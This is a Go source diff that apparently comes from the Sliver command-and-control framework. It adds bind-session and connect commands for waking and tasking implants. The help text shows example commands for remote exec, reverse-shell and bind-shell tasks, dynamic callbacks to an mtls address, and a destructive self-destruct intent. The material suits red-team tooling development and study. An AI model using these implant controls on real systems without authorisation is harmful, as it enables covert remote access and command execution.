@@ -205,7 +205,7 @@ func Commands(con *console.SliverClient) []*cobra.Command {
 		f.StringP("secret-env", "S", "", "env var name holding the HMAC shared secret (preferred; no secret in argv)")
 		f.String("secret", "", "HMAC shared secret (direct value; visible in ps — prefer --secret-env). Omit both for stdin prompt")
 		f.String("server-id", "sliver-trigger", "audit identifier embedded in events")
-		f.StringArrayP("task", "i", nil, "task binding NAME:KIND:ARGS (repeatable; KIND in wake-beacon, stop-job, exec, reverse-shell)")
+		f.StringArrayP("task", "i", nil, "task binding NAME:KIND:ARGS (repeatable; KIND in wake-callback, stop-job, exec, reverse-shell, bind)")
 		f.StringArray("allowed-source", nil, "allow only this IP or CIDR (repeatable; empty=any)")
 		f.StringArray("allowed-client", nil, "allow only this client_id (repeatable; empty=any)")
 	})
@@ -231,7 +231,7 @@ This enables interactive, on-the-fly tasking of active trigger jobs,
 analogous to beacon interaction.
 
 Examples:
-  trigger dispatch 7 wake-beacon-alpha
+  trigger dispatch 7 wake-callback-alpha
   trigger dispatch 7 kill-mtls`,
 		Args: cobra.ExactArgs(2),
 		Run: func(cmd *cobra.Command, args []string) {
@@ -256,9 +256,12 @@ When a trigger index is used, the port, secret, and client-id are
 auto-populated from the implant's build config and stored target mapping.
 
 Intents:
-  "wake"           Wake a dormant implant (fire-and-forget)
+  "wake"           Wake a dormant implant — callback session (fire-and-forget)
   "self-destruct"  Wipe the implant and exit (fire-and-forget, DESTRUCTIVE)
   "exec"           Execute a command and return output (bidirectional)
+
+Use --bind with wake to open a bind session on the implant instead of a callback.
+Use --callback with wake to specify a dynamic callback address.
 
 The secret must match the one baked into the implant at generation time.
 
@@ -269,7 +272,10 @@ Examples:
   trigger send 10.0.0.5 wake --secret "my-shared-secret" --client-id red-team-01
   trigger send 1 wake            (uses index from 'triggers' list)
   trigger send 2 exec --payload "whoami"
-  trigger send 1 wake --callback mtls://10.0.0.5:8888   (dynamic callback)`,
+  trigger send 1 wake --callback mtls://10.0.0.5:8888      (dynamic callback session)
+  trigger send 1 wake --bind                                (TCP bind on random port)
+  trigger send 1 wake --bind --bind-port 5555               (TCP bind on port 5555)
+  trigger send 1 wake --bind --bind-port 5555 --bind-proto udp  (UDP bind)`,
 		Args: cobra.ExactArgs(2),
 		Run: func(cmd *cobra.Command, args []string) {
 			TriggerSendCmd(cmd, con, args)
@@ -284,8 +290,42 @@ Examples:
 		f.StringP("output", "o", "", "write exec output to file (only for intent=exec)")
 		f.String("comms", "", "preferred C2 transport for wake intent (e.g. mtls, wg)")
 		f.StringP("callback", "c", "", "dynamic callback address for wake intent (e.g. mtls://10.0.0.5:8888)")
+		f.BoolP("bind", "b", false, "open a bind session on the implant instead of callback (use with wake intent)")
+		f.Uint32("bind-port", 0, "port for bind session (0 = random ephemeral; requires --bind)")
+		f.String("bind-proto", "", "protocol for bind session: tcp or udp (default tcp; requires --bind)")
+		f.Uint32("ttl", 30, "seconds the bind port stays open waiting for a connection (default 30; requires --bind)")
+		f.Bool("no-session", false, "UDP bind: raw encrypted shell instead of full session (requires --bind --bind-proto udp)")
+		f.Bool("no-connect", false, "don't auto-connect to the bind port; use 'trigger connect' later (requires --bind)")
 	})
 	triggerCmd.AddCommand(triggerSendCmd)
+
+	// Trigger connect: manually connect to an implant's bind port.
+	triggerConnectCmd := &cobra.Command{
+		Use:   "connect <target-ip|trigger-index> <bind-address>",
+		Short: "Connect to an implant's bind port (auth + encrypted session)",
+		Long: `Manually connect to an implant's bind listener. Use this after
+'trigger send ... wake --bind --no-connect' or when you need to re-attach
+to a still-open bind port.
+
+The bind-address is the address reported by the implant (e.g., "tcp://0.0.0.0:52341"
+or "udp://0.0.0.0:41337"). The server performs the HMAC auth handshake,
+establishes encryption, and creates a full Sliver session.
+
+Examples:
+  trigger connect 192.168.1.42 tcp://0.0.0.0:52341 --secret-env TRIGGERWAKE_SECRET
+  trigger connect 1 tcp://0.0.0.0:5555     (uses stored secret from trigger index)
+  trigger connect 1 udp://0.0.0.0:4444     (KCP session over UDP)`,
+		Args: cobra.ExactArgs(2),
+		Run: func(cmd *cobra.Command, args []string) {
+			TriggerConnectCmd(cmd, con, args)
+		},
+	}
+	flags.Bind("Trigger connect", false, triggerConnectCmd, func(f *pflag.FlagSet) {
+		f.Uint32P("port", "p", 46290, "UDP port the implant's triggerwake is bound to (for index resolution)")
+		f.StringP("secret-env", "S", "", "env var name holding the HMAC shared secret")
+		f.String("secret", "", "HMAC shared secret (direct value)")
+	})
+	triggerCmd.AddCommand(triggerConnectCmd)
 
 	// Carapace completions:
 	//   - `trigger tasks <TAB>` -> active job IDs (so operators
@@ -306,7 +346,7 @@ Examples:
 	)
 	flags.BindFlagCompletions(triggerCmd, func(comp *carapace.ActionMap) {
 		(*comp)["task"] = carapace.ActionValues(
-			"wake-beacon", "stop-job", "exec", "reverse-shell",
+			"wake-callback", "stop-job", "exec", "reverse-shell", "bind",
 		).Tag("trigger task kinds")
 	})
 
